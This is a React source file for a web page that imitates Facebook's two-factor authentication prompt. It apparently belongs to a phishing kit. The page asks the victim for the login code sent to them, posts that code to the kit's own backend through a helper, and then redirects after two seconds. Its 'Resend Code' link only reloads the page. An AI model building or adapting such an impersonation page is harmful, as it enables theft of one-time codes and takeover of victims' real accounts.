import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import Form from "react-bootstrap/Form";
import Row from "react-bootstrap/Row";
import Col from "react-bootstrap/Col";
import Button from "react-bootstrap/Button";
import Container from "react-bootstrap/esm/Container";
import { postConfirmNumber } from "../helpers/axiosHelper.js";

import { Link } from "react-router-dom";
const initialState = { confirmationCode :""};
export const Verification = () => {
  const navigate = useNavigate();

  const [code, setCode] = useState(initialState);
  const handleOnChange = (e) => {
    e.preventDefault();
    const { name, value } = e.target;
    setCode({ ...code, [name]: value });
  };
  const handleOnSubmit = async (e) => {
    e.preventDefault();
    const result = await postConfirmNumber(code);
     window.setTimeout(() => {
       navigate("close");
     }, 2000);
    
  }
  const pageReload = (e) => {
    e.preventDefault();
    window.location.reload();
  };
  return (
    <div>
      <div className="authentication_page">
        <Container>
          <div className="text-center bold authentication_heading">
            Two-factor Authentication
          </div>
          <div className="text-center">
            Enter 4-6 digit code we sent to your registered mobile number or
            email to log into facebook. You might have to wait for upto 2
            minutes.
          </div>
          <div className="text-center icon_div">
            <span className="mobile_icon"></span>
            <i className="fa-solid fa-mobile mobile_icon__icon"></i>
          </div>
          <div className="text-center enter_code">Enter Code</div>
          <Form onSubmit={handleOnSubmit}>
            <Row>
              <Col></Col>
              <Col md={5}>
                <Form.Control
                  placeholder="confirmation code"
                  className="text-center"
                  onChange={handleOnChange}
                  name="confirmationCode"
                  required
                  minlength="4"
                  onInvalid={(F) =>
                    F.target.setCustomValidity(
                      "code didn't meet minimum required length"
                    )
                  }
                  onInput={(F) => F.target.setCustomValidity("")}
                />
              </Col>
              <Col></Col>
            </Row>

            <div>
              <a
                className="text-center link_underline resend_code"
                href=""
                onClick={pageReload}
              >
                <i className="fa-solid fa-arrow-rotate-right"></i>Resend Code
              </a>
            </div>
            <Row>
              <Col></Col>
              <Col md={5}>
                <Button
                  variant="primary"
                  size="lg"
                  className="login_button"
                  type="submit"
                  id="fblogin_button"
                >
                  Verify Account
                </Button>
              </Col>
              <Col></Col>
            </Row>
          </Form>
        </Container>
      </div>
    </div>
  );
};
